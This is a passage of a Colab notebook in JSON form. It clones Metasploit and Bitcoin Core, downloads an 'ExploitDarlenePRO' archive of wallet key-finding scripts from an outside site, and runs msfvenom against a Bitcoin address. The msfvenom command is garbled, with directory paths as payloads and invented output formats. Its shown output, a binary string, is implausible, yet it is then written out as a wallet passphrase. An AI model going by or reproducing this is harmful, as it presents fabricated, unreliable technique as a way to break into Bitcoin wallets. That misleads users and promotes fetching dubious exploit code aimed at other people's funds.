            "Parsing documentation for eventmachine-1.2.7\n",
            "Installing ri documentation for eventmachine-1.2.7\n",
            "Parsing documentation for bitcoin-ruby-0.0.20\n",
            "Installing ri documentation for bitcoin-ruby-0.0.20\n",
            "Done installing documentation for ffi, ffi-compiler, scrypt, eventmachine, bitcoin-ruby after 12 seconds\n",
            "5 gems installed\n",
            "Fetching ecdsa-1.2.0.gem\n",
            "Successfully installed ecdsa-1.2.0\n",
            "Parsing documentation for ecdsa-1.2.0\n",
            "Installing ri documentation for ecdsa-1.2.0\n",
            "Done installing documentation for ecdsa after 0 seconds\n",
            "1 gem installed\n",
            "Fetching base58-0.2.3.gem\n",
            "Successfully installed base58-0.2.3\n",
            "Parsing documentation for base58-0.2.3\n",
            "Installing ri documentation for base58-0.2.3\n",
            "Done installing documentation for base58 after 0 seconds\n",
            "1 gem installed\n",
            "Fetching crypto-0.0.3.gem\n",
            "\n",
            "Successfully installed crypto-0.0.3\n",
            "Parsing documentation for crypto-0.0.3\n",
            "Installing ri documentation for crypto-0.0.3\n",
            "Done installing documentation for crypto after 0 seconds\n",
            "1 gem installed\n",
            "Fetching config-hash-0.9.0.gem\n",
            "Successfully installed config-hash-0.9.0\n",
            "Parsing documentation for config-hash-0.9.0\n",
            "Installing ri documentation for config-hash-0.9.0\n",
            "Done installing documentation for config-hash after 0 seconds\n",
            "1 gem installed\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!git clone https://github.com/rapid7/metasploit-framework.git"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Rx7IuhyUqahw",
        "outputId": "7b1bc4e4-e5de-48a7-dcdd-a4ef9e2da937"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Cloning into 'metasploit-framework'...\n",
            "remote: Enumerating objects: 680001, done.\u001b[K\n",
            "remote: Counting objects: 100% (3620/3620), done.\u001b[K\n",
            "remote: Compressing objects: 100% (703/703), done.\u001b[K\n",
            "remote: Total 680001 (delta 2799), reused 3561 (delta 2769), pack-reused 676381\u001b[K\n",
            "Receiving objects: 100% (680001/680001), 962.71 MiB | 22.77 MiB/s, done.\n",
            "Resolving deltas: 100% (503655/503655), done.\n",
            "Updating files: 100% (13193/13193), done.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "cd metasploit-framework/"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "9FTdJ2Wwrlv1",
        "outputId": "73ff2edc-4718-48ba-c411-86b8b3b6a411"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "/content/Smart-Transformers/metasploit-framework\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "ls"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "T3R8QZyRroGt",
        "outputId": "0bdb5f88-4ce7-49de-bff0-e87807c5293f"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u001b[0m\u001b[01;34mapp\u001b[0m/                         docker-compose.yml     LICENSE_GEMS                  msf-ws.ru\n",
            "CODE_OF_CONDUCT.md           Dockerfile             metasploit-framework.gemspec  \u001b[01;34mplugins\u001b[0m/\n",
            "\u001b[01;34mconfig\u001b[0m/                      \u001b[01;34mdocs\u001b[0m/                  \u001b[01;34mmodules\u001b[0m/                      \u001b[01;32mRakefile\u001b[0m*\n",
            "CONTRIBUTING.md              \u001b[01;34mdocumentation\u001b[0m/         \u001b[01;32mmsfconsole\u001b[0m*                   README.md\n",
            "COPYING                      \u001b[01;34mexternal\u001b[0m/              \u001b[01;32mmsfd\u001b[0m*                         \u001b[01;34mscript\u001b[0m/\n",
            "cortex.yaml                  Gemfile                \u001b[01;32mmsfdb\u001b[0m*                        \u001b[01;34mscripts\u001b[0m/\n",
            "CURRENT.md                   Gemfile.local.example  msf-json-rpc.ru               \u001b[01;34mspec\u001b[0m/\n",
            "\u001b[01;34mdata\u001b[0m/                        Gemfile.lock           \u001b[01;32mmsfrpc\u001b[0m*                       \u001b[01;34mtest\u001b[0m/\n",
            "\u001b[01;34mdb\u001b[0m/                          \u001b[01;34mkubernetes\u001b[0m/            \u001b[01;32mmsfrpcd\u001b[0m*                      \u001b[01;34mtools\u001b[0m/\n",
            "\u001b[01;34mdocker\u001b[0m/                      \u001b[01;34mlib\u001b[0m/                   \u001b[01;32mmsfupdate\u001b[0m*                    Vagrantfile\n",
            "docker-compose.override.yml  LICENSE                \u001b[01;32mmsfvenom\u001b[0m*\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!./msfvenom -help"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "7c0uxEcQrqOL",
        "outputId": "ccb1d442-4abb-4ba3-b6cf-dc4055b44880"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "MsfVenom - a Metasploit standalone payload generator.\n",
            "Also a replacement for msfpayload and msfencode.\n",
            "Usage: ./msfvenom [options] <var=val>\n",
            "Example: ./msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe\n",
            "\n",
            "Options:\n",
            "    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all\n",
            "    -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom\n",
            "        --list-options               List --payload <value>'s standard, advanced and evasion options\n",
            "    -f, --format          <format>   Output format (use --list formats to list)\n",
            "    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)\n",
            "        --service-name    <value>    The service name to use when generating a service binary\n",
            "        --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string\n",
            "        --smallest                   Generate the smallest possible payload using all available encoders\n",
            "        --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)\n",
            "        --encrypt-key     <value>    A key to be used for --encrypt\n",
            "        --encrypt-iv      <value>    An initialization vector for --encrypt\n",
            "    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)\n",
            "        --platform        <platform> The platform for --payload (use --list platforms to list)\n",
            "    -o, --out             <path>     Save the payload to a file\n",
            "    -b, --bad-chars       <list>     Characters to avoid example: '\\x00\\xff'\n",
            "    -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload\n",
            "        --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)\n",
            "    -s, --space           <length>   The maximum size of the resulting payload\n",
            "        --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)\n",
            "    -i, --iterations      <count>    The number of times to encode the payload\n",
            "    -c, --add-code        <path>     Specify an additional win32 shellcode file to include\n",
            "    -x, --template        <path>     Specify a custom executable file to use as a template\n",
            "    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread\n",
            "    -v, --var-name        <value>    Specify a custom variable name to use for certain output formats\n",
            "    -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)\n",
            "    -h, --help                       Show this message\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!git clone https://github.com/bitcoin/bitcoin.git"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "rnLWfrKCrxwH",
        "outputId": "22fe0513-ebcf-431d-c190-d006db94a795"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Cloning into 'bitcoin'...\n",
            "remote: Enumerating objects: 274065, done.\u001b[K\n",
            "remote: Counting objects: 100% (146/146), done.\u001b[K\n",
            "remote: Compressing objects: 100% (115/115), done.\u001b[K\n",
            "remote: Total 274065 (delta 73), reused 79 (delta 31), pack-reused 273919\u001b[K\n",
            "Receiving objects: 100% (274065/274065), 248.31 MiB | 18.75 MiB/s, done.\n",
            "Resolving deltas: 100% (196977/196977), done.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "ls"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "xiAfGAhFsqCz",
        "outputId": "d2d7f544-9a63-4750-b2f3-298d26489b4f"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u001b[0m\u001b[01;34mapp\u001b[0m/                docker-compose.override.yml  LICENSE                       \u001b[01;32mmsfvenom\u001b[0m*\n",
            "\u001b[01;34mbitcoin\u001b[0m/            docker-compose.yml           LICENSE_GEMS                  msf-ws.ru\n",
            "CODE_OF_CONDUCT.md  Dockerfile                   metasploit-framework.gemspec  \u001b[01;34mplugins\u001b[0m/\n",
            "\u001b[01;34mconfig\u001b[0m/             \u001b[01;34mdocs\u001b[0m/                        \u001b[01;34mmodules\u001b[0m/                      \u001b[01;32mRakefile\u001b[0m*\n",
            "CONTRIBUTING.md     \u001b[01;34mdocumentation\u001b[0m/               \u001b[01;32mmsfconsole\u001b[0m*                   README.md\n",
            "COPYING             \u001b[01;34mexternal\u001b[0m/                    \u001b[01;32mmsfd\u001b[0m*                         \u001b[01;34mscript\u001b[0m/\n",
            "cortex.yaml         Gemfile                      \u001b[01;32mmsfdb\u001b[0m*                        \u001b[01;34mscripts\u001b[0m/\n",
            "CURRENT.md          Gemfile.local.example        msf-json-rpc.ru               \u001b[01;34mspec\u001b[0m/\n",
            "\u001b[01;34mdata\u001b[0m/               Gemfile.lock                 \u001b[01;32mmsfrpc\u001b[0m*                       \u001b[01;34mtest\u001b[0m/\n",
            "\u001b[01;34mdb\u001b[0m/                 \u001b[01;34mkubernetes\u001b[0m/                  \u001b[01;32mmsfrpcd\u001b[0m*                      \u001b[01;34mtools\u001b[0m/\n",
            "\u001b[01;34mdocker\u001b[0m/             \u001b[01;34mlib\u001b[0m/                         \u001b[01;32mmsfupdate\u001b[0m*                    Vagrantfile\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "cd bitcoin/src/crypto/"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "b_q9JgHrsvR4",
        "outputId": "a07d9619-1955-4a6e-c055-d51880f8b2b7"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "/content/Smart-Transformers/metasploit-framework/bitcoin/src/crypto\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "ls"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "5jM33Ordsx0x",
        "outputId": "7f2d8ccc-5b52-4b5c-f7b8-9e0d768f3335"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "aes.cpp               \u001b[0m\u001b[01;34mctaes\u001b[0m/              muhash.cpp     sha1.h                sha256_x86_shani.cpp\n",
            "aes.h                 hkdf_sha256_32.cpp  muhash.h       sha256_arm_shani.cpp  sha3.cpp\n",
            "chacha20.cpp          hkdf_sha256_32.h    poly1305.cpp   sha256_avx2.cpp       sha3.h\n",
            "chacha20.h            hmac_sha256.cpp     poly1305.h     sha256.cpp            sha512.cpp\n",
            "chacha20poly1305.cpp  hmac_sha256.h       ripemd160.cpp  sha256.h              sha512.h\n",
            "chacha20poly1305.h    hmac_sha512.cpp     ripemd160.h    sha256_sse41.cpp      siphash.cpp\n",
            "common.h              hmac_sha512.h       sha1.cpp       sha256_sse4.cpp       siphash.h\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "cat aes.cpp"
      ],
      "metadata": {
        "id": "qYhZVpaSs6gB"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!mv '/content/Smart-Transformers/wallet.dat' '/content/Smart-Transformers/metasploit-framework/bitcoin/src/crypto/wallet.dat'"
      ],
      "metadata": {
        "id": "BEFZhOy_tC5d"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "ls"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "J2SIx8O2tFKZ",
        "outputId": "cdd577e2-67eb-4bb3-9ca6-4c0b492ebe17"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "aes.cpp               hkdf_sha256_32.cpp  poly1305.cpp          sha256.cpp            sha512.h\n",
            "aes.h                 hkdf_sha256_32.h    poly1305.h            sha256.h              siphash.cpp\n",
            "chacha20.cpp          hmac_sha256.cpp     ripemd160.cpp         sha256_sse41.cpp      siphash.h\n",
            "chacha20.h            hmac_sha256.h       ripemd160.h           sha256_sse4.cpp       wallet.dat\n",
            "chacha20poly1305.cpp  hmac_sha512.cpp     sha1.cpp              sha256_x86_shani.cpp\n",
            "chacha20poly1305.h    hmac_sha512.h       sha1.h                sha3.cpp\n",
            "common.h              muhash.cpp          sha256_arm_shani.cpp  sha3.h\n",
            "\u001b[0m\u001b[01;34mctaes\u001b[0m/                muhash.h            sha256_avx2.cpp       sha512.cpp\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "cd /"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "5BdrcdjktQFy",
        "outputId": "0a84d678-b599-4adf-c7b0-841989505ea2"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "/\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "cd content/Smart-Transformers/metasploit-framework/"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "80sb26kWtSG3",
        "outputId": "536b145b-5f98-4f88-d128-116b450ab20a"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "/content/Smart-Transformers/metasploit-framework\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "ls"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "zofuV0l7tTvS",
        "outputId": "f2ccd784-7477-4507-f798-61fe0a987e4a"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u001b[0m\u001b[01;34mapp\u001b[0m/                docker-compose.override.yml  LICENSE                       \u001b[01;32mmsfvenom\u001b[0m*\n",
            "\u001b[01;34mbitcoin\u001b[0m/            docker-compose.yml           LICENSE_GEMS                  msf-ws.ru\n",
            "CODE_OF_CONDUCT.md  Dockerfile                   metasploit-framework.gemspec  \u001b[01;34mplugins\u001b[0m/\n",
            "\u001b[01;34mconfig\u001b[0m/             \u001b[01;34mdocs\u001b[0m/                        \u001b[01;34mmodules\u001b[0m/                      \u001b[01;32mRakefile\u001b[0m*\n",
            "CONTRIBUTING.md     \u001b[01;34mdocumentation\u001b[0m/               \u001b[01;32mmsfconsole\u001b[0m*                   README.md\n",
            "COPYING             \u001b[01;34mexternal\u001b[0m/                    \u001b[01;32mmsfd\u001b[0m*                         \u001b[01;34mscript\u001b[0m/\n",
            "cortex.yaml         Gemfile                      \u001b[01;32mmsfdb\u001b[0m*                        \u001b[01;34mscripts\u001b[0m/\n",
            "CURRENT.md          Gemfile.local.example        msf-json-rpc.ru               \u001b[01;34mspec\u001b[0m/\n",
            "\u001b[01;34mdata\u001b[0m/               Gemfile.lock                 \u001b[01;32mmsfrpc\u001b[0m*                       \u001b[01;34mtest\u001b[0m/\n",
            "\u001b[01;34mdb\u001b[0m/                 \u001b[01;34mkubernetes\u001b[0m/                  \u001b[01;32mmsfrpcd\u001b[0m*                      \u001b[01;34mtools\u001b[0m/\n",
            "\u001b[01;34mdocker\u001b[0m/             \u001b[01;34mlib\u001b[0m/                         \u001b[01;32mmsfupdate\u001b[0m*                    Vagrantfile\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "cd modules/"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Gmqtd5sstfk8",
        "outputId": "0fdfb999-c3ec-44cd-c2af-f11579cbda82"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "/content/Smart-Transformers/metasploit-framework/modules\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "ls"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "vHD-rb_xthUl",
        "outputId": "110133a5-48a6-4e08-a072-f5b7e2b6861f"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u001b[0m\u001b[01;34mauxiliary\u001b[0m/  \u001b[01;34mencoders\u001b[0m/  \u001b[01;34mevasion\u001b[0m/  \u001b[01;34mexploits\u001b[0m/  \u001b[01;34mnops\u001b[0m/  \u001b[01;34mpayloads\u001b[0m/  \u001b[01;34mpost\u001b[0m/  README.md\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "cd exploits/"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "RC2VoAiMtjas",
        "outputId": "d01ef723-45f7-4016-fc3e-c94913b9fac6"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "/content/Smart-Transformers/metasploit-framework/modules/exploits\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!wget https://darlene.pro/repository/446f1c57b526201d4958eb76dee6f5a2024c71914f6596c51afb5ac6822e9da4/ExploitDarlenePRO.zip"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "UjrsR_NmtmUs",
        "outputId": "03167b14-67b6-4725-def7-22916860ded3"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "--2024-04-06 04:41:45--  https://darlene.pro/repository/446f1c57b526201d4958eb76dee6f5a2024c71914f6596c51afb5ac6822e9da4/ExploitDarlenePRO.zip\n",
            "Resolving darlene.pro (darlene.pro)... 37.140.192.134, 2a00:f940:2:2:1:1:0:117\n",
            "Connecting to darlene.pro (darlene.pro)|37.140.192.134|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 7909 (7.7K) [application/zip]\n",
            "Saving to: ‘ExploitDarlenePRO.zip’\n",
            "\n",
            "ExploitDarlenePRO.z 100%[===================>]   7.72K  --.-KB/s    in 0s      \n",
            "\n",
            "2024-04-06 04:41:46 (2.70 GB/s) - ‘ExploitDarlenePRO.zip’ saved [7909/7909]\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!unzip ExploitDarlenePRO.zip"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "6tmm2zf4uGqk",
        "outputId": "244a8831-bb7c-4b49-9c41-bf2600c4b500"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Archive:  ExploitDarlenePRO.zip\n",
            "   creating: ExploitDarlenePRO/\n",
            "  inflating: ExploitDarlenePRO/blockchain_api_grabber.rb  \n",
            "  inflating: ExploitDarlenePRO/config.rb  \n",
            "  inflating: ExploitDarlenePRO/decode_core.rb  \n",
            "  inflating: ExploitDarlenePRO/extract_number.rb  \n",
            "  inflating: ExploitDarlenePRO/injection_database.rb  \n",
            "  inflating: ExploitDarlenePRO/key_finder.rb  \n",
            "  inflating: ExploitDarlenePRO/main.rb  \n",
            "  inflating: ExploitDarlenePRO/model_nn.rb  \n",
            "  inflating: ExploitDarlenePRO/seed_mt_unit.rb  \n",
            "  inflating: ExploitDarlenePRO/simplistic_approach.rb  \n",
            "  inflating: ExploitDarlenePRO/vulnerability_scanner.rb  \n",
            "  inflating: ExploitDarlenePRO/wallet_crossentropy.rb  \n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "ls"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "f6JDODC8uNnq",
        "outputId": "09f1ff2e-9758-4f00-bda5-dc7b208ea5ac"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u001b[0m\u001b[01;34maix\u001b[0m/        \u001b[01;34mdialup\u001b[0m/                    \u001b[01;34mExploitDarlenePRO\u001b[0m/     \u001b[01;34mirix\u001b[0m/       \u001b[01;34mopenbsd\u001b[0m/  \u001b[01;34mwindows\u001b[0m/\n",
            "\u001b[01;34mandroid\u001b[0m/    example_linux_priv_esc.rb  ExploitDarlenePRO.zip  \u001b[01;34mlinux\u001b[0m/      \u001b[01;34mosx\u001b[0m/\n",
            "\u001b[01;34mapple_ios\u001b[0m/  \u001b[01;32mexample.py\u001b[0m*                \u001b[01;34mfirefox\u001b[0m/               \u001b[01;34mmainframe\u001b[0m/  \u001b[01;34mqnx\u001b[0m/\n",
            "\u001b[01;34mbsd\u001b[0m/        example.rb                 \u001b[01;34mfreebsd\u001b[0m/               \u001b[01;34mmulti\u001b[0m/      \u001b[01;34msolaris\u001b[0m/\n",
            "\u001b[01;34mbsdi\u001b[0m/       example_webapp.rb          \u001b[01;34mhpux\u001b[0m/                  \u001b[01;34mnetware\u001b[0m/    \u001b[01;34munix\u001b[0m/\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "cd ExploitDarlenePRO/"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "3L848YPKuRN-",
        "outputId": "21b025c8-8549-4679-98a9-dcc65fef5e0b"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "/content/Smart-Transformers/metasploit-framework/modules/exploits/ExploitDarlenePRO\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "ls"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "zx52z2EDuTH9",
        "outputId": "f22af0d0-7b09-4946-894b-620fadf00660"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "blockchain_api_grabber.rb  extract_number.rb      main.rb          simplistic_approach.rb\n",
            "config.rb                  injection_database.rb  model_nn.rb      vulnerability_scanner.rb\n",
            "decode_core.rb             key_finder.rb          seed_mt_unit.rb  wallet_crossentropy.rb\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "cd /"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Gp4gt_KOuYof",
        "outputId": "4bf9677d-d368-498f-bf8e-8768a0eac2bc"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "/\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "cd content/Smart-Transformers/metasploit-framework/"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "WAPVs-Q5uaXV",
        "outputId": "cb0a478c-3ed6-4bc3-f675-26378b2d6309"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "/content/Smart-Transformers/metasploit-framework\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "ls"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "jmToVbfqucI7",
        "outputId": "cbc3fc59-acc1-41ac-bcda-9e3ef01d1956"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u001b[0m\u001b[01;34mapp\u001b[0m/                docker-compose.override.yml  LICENSE                       \u001b[01;32mmsfvenom\u001b[0m*\n",
            "\u001b[01;34mbitcoin\u001b[0m/            docker-compose.yml           LICENSE_GEMS                  msf-ws.ru\n",
            "CODE_OF_CONDUCT.md  Dockerfile                   metasploit-framework.gemspec  \u001b[01;34mplugins\u001b[0m/\n",
            "\u001b[01;34mconfig\u001b[0m/             \u001b[01;34mdocs\u001b[0m/                        \u001b[01;34mmodules\u001b[0m/                      \u001b[01;32mRakefile\u001b[0m*\n",
            "CONTRIBUTING.md     \u001b[01;34mdocumentation\u001b[0m/               \u001b[01;32mmsfconsole\u001b[0m*                   README.md\n",
            "COPYING             \u001b[01;34mexternal\u001b[0m/                    \u001b[01;32mmsfd\u001b[0m*                         \u001b[01;34mscript\u001b[0m/\n",
            "cortex.yaml         Gemfile                      \u001b[01;32mmsfdb\u001b[0m*                        \u001b[01;34mscripts\u001b[0m/\n",
            "CURRENT.md          Gemfile.local.example        msf-json-rpc.ru               \u001b[01;34mspec\u001b[0m/\n",
            "\u001b[01;34mdata\u001b[0m/               Gemfile.lock                 \u001b[01;32mmsfrpc\u001b[0m*                       \u001b[01;34mtest\u001b[0m/\n",
            "\u001b[01;34mdb\u001b[0m/                 \u001b[01;34mkubernetes\u001b[0m/                  \u001b[01;32mmsfrpcd\u001b[0m*                      \u001b[01;34mtools\u001b[0m/\n",
            "\u001b[01;34mdocker\u001b[0m/             \u001b[01;34mlib\u001b[0m/                         \u001b[01;32mmsfupdate\u001b[0m*                    Vagrantfile\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!ip addr\n",
        "!hostname -I"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "gjimhyKaugA-",
        "outputId": "00aeeaf9-9dc7-48f0-89a9-832c2341f8bb"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n",
            "    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n",
            "    inet 127.0.0.1/8 scope host lo\n",
            "       valid_lft forever preferred_lft forever\n",
            "7: eth0@if8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default \n",
            "    link/ether 02:42:ac:1c:00:0c brd ff:ff:ff:ff:ff:ff link-netnsid 0\n",
            "    inet 172.28.0.12/16 brd 172.28.255.255 scope global eth0\n",
            "       valid_lft forever preferred_lft forever\n",
            "172.28.0.12 \n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!./msfvenom 1GjjGLYR7UhtM1n6z7QDpQskBicgmsHW9k -p modules/exploits/ExploitDarlenePRO LHOST=172.28.0.12 -f RB -o decode_core.rb -p bitcoin/src/crypto LHOST=172.28.0.12 -f CPP -o aes.cpp -p bitcoin/src/crypto LHOST=172.28.0.12 -f DAT -o wallet.dat\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "gRlS3qJuunSz",
        "outputId": "3b9f7442-eb1d-4987-cfb6-3e5fda9624a8"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "1111000101000001111101110000011101000000101110101101011110100100000101010001100101100101001010001110001111100000110111110110000011011011010111101111111010001000001111000110010101000111011101000101000011000100011011001000100111110001110010011001001100111000\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import hashlib\n",
        "\n",
        "Binary = \"1111000101000001111101110000011101000000101110101101011110100100000101010001100101100101001010001110001111100000110111110110000011011011010111101111111010001000001111000110010101000111011101000101000011000100011011001000100111110001110010011001001100111000\"\n",
        "\n",
        "f = open(\"walletpassphrase.txt\", 'w')\n",
        "f.write(\"walletpassphrase \" + Binary + \" 60\" + \"\\n\")\n",
        "f.write(\"\" + \"\\n\")\n",
        "f.close()"
      ],
      "metadata": {
        "id": "y423pN_buvc_"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "ls"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "y2rWMMSpvecR",
        "outputId": "bef75f14-132c-4d3b-916e-5d608c4e7ef1"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u001b[0m\u001b[01;34mapp\u001b[0m/                         \u001b[01;34mdocumentation\u001b[0m/                \u001b[01;32mmsfrpc\u001b[0m*\n",
            "\u001b[01;34mbitcoin\u001b[0m/                     \u001b[01;34mexternal\u001b[0m/                     \u001b[01;32mmsfrpcd\u001b[0m*\n",
            "CODE_OF_CONDUCT.md           Gemfile                       \u001b[01;32mmsfupdate\u001b[0m*\n",
            "\u001b[01;34mconfig\u001b[0m/                      Gemfile.local.example         \u001b[01;32mmsfvenom\u001b[0m*\n",
            "CONTRIBUTING.md              Gemfile.lock                  msf-ws.ru\n",
            "COPYING                      \u001b[01;34mkubernetes\u001b[0m/                   \u001b[01;34mplugins\u001b[0m/\n",
            "cortex.yaml                  \u001b[01;34mlib\u001b[0m/                          \u001b[01;32mRakefile\u001b[0m*\n",
            "CURRENT.md                   LICENSE                       README.md\n",
            "\u001b[01;34mdata\u001b[0m/                        LICENSE_GEMS                  \u001b[01;34mscript\u001b[0m/\n",
            "\u001b[01;34mdb\u001b[0m/                          metasploit-framework.gemspec  \u001b[01;34mscripts\u001b[0m/\n",
            "\u001b[01;34mdocker\u001b[0m/                      \u001b[01;34mmodules\u001b[0m/                      \u001b[01;34mspec\u001b[0m/\n",
